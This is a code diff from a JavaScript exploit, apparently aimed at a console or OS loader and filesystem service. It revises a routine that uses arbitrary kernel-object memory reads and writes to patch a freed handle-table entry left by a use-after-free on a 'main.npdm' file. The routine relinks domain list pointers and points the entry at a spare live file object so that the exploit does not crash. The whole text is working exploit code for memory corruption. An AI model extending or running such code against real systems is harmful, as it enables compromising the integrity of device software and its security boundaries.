@@ -828,11 +828,11 @@ async function main() {
 
     // The consumed NPDM file cannot be restored: its Read frees the entry and
     // the close path faults on the dead object (11:10..14:37). Open a fresh file
-    // on the donor filesystem instead, take its domain entry away from the donor
-    // domain *without releasing the object*, and give that entry's reference to
-    // the freed NPDM slot in the Loader's target domain. The Loader's close then
-    // removes a valid target-domain entry whose object is a live file, so the
-    // close never touches the consumed object or the donor filesystem.
+    // instead (CodeFS by default), take its domain entry away from its own
+    // domain *without releasing the object*, and put the freed NPDM id back into
+    // that same domain. The entry and object then share a domain, so the close
+    // either closes a normal file object or is rejected without touching the
+    // consumed object or the donor filesystem.
     async function adoptSpareEntry(id) {
       const table = Number(layout.table), count = Number(layout.count), manager = Number(layout.manager);
       if (!Number.isSafeInteger(table) || !Number.isInteger(count) ||
@@ -854,7 +854,14 @@ async function main() {
         await memory.writeU64(tPrev, target, tNext);
         await memory.writeU64(tNext + 0x08, target, tPrev);
       }
-      const spare = await memory.request({command: 'root-native-file-spare', name: 'main.npdm'});
+      let spare;
+      try {
+        spare = await memory.request({command: 'root-native-file-spare', name: 'main.npdm', source: 'code'});
+      } catch (error) {
+        // The CodeFS binding is the stable source; the donor is the fallback if
+        // the analysis CodeFS was not retained on this boot.
+        spare = await memory.request({command: 'root-native-file-spare', name: 'main.npdm', source: 'donor'});
+      }
       const spareSlot = table + (spare.id - 1) * 0x30;
       const sb = await memory.read(spareSlot, 0x30);
       const object = ptr(sb, 0x20), metadata = ptr(sb, 0x28), spareDomain = ptr(sb, 0x18);
@@ -887,15 +894,20 @@ async function main() {
         await memory.writeU64(manager + 0x28, head, spareSlot);
         if (freed && !await unlinkFree(target).catch(() => false)) return null;
       }
-      // Link the entry into the target domain and point it at the spare object.
-      const sentinel = Number(root.targetDomain) + 0x20;
+      // Keep the entry in the same domain as the object it now points at. The
+      // close path faults when a target-domain entry references an object whose
+      // own domain is elsewhere (the donor target and the target-domain spare
+      // both did). The spare entry already lives in the object's domain, so put
+      // the freed id there too. If the FS checks the caller's domain it replies
+      // with an error; if it uses the table id it closes a normal file object.
+      const sentinel = spareDomain + 0x20;
       const sNext = await memory.pointer(sentinel);
       const base = spareSlot === target ? sb : targetBefore;
       const updated = Buffer.from(base);
       updated.writeBigUInt64LE(BigInt(sNext), 0x00);
       updated.writeBigUInt64LE(BigInt(sentinel), 0x08);
       updated.writeBigUInt64LE(0n, 0x10);
-      updated.writeBigUInt64LE(BigInt(root.targetDomain), 0x18);
+      updated.writeBigUInt64LE(BigInt(spareDomain), 0x18);
       updated.writeBigUInt64LE(BigInt(object), 0x20);
       updated.writeBigUInt64LE(BigInt(metadata), 0x28);
       await memory.write(target, base, updated);
@@ -905,11 +917,11 @@ async function main() {
       }
       await memory.writeU64(sentinel, sNext, target);
       const readback = await memory.read(target, 0x30);
-      if (ptr(readback, 0x18) !== Number(root.targetDomain) || ptr(readback, 0x20) !== object)
+      if (ptr(readback, 0x18) !== spareDomain || ptr(readback, 0x20) !== object)
         return null;
       const header = await memory.read(object, 0x80).then(b => b.toString('hex')).catch(() => null);
       return {id, slot: target, object, metadata, vptr, header, spare: spare.id,
-        copy: spare.handle, donorDomain: spareDomain, sNext};
+        copy: spare.handle, spareDomain, sNext};
     }
 
     // The file Read removes its own domain entry and releases one reference.
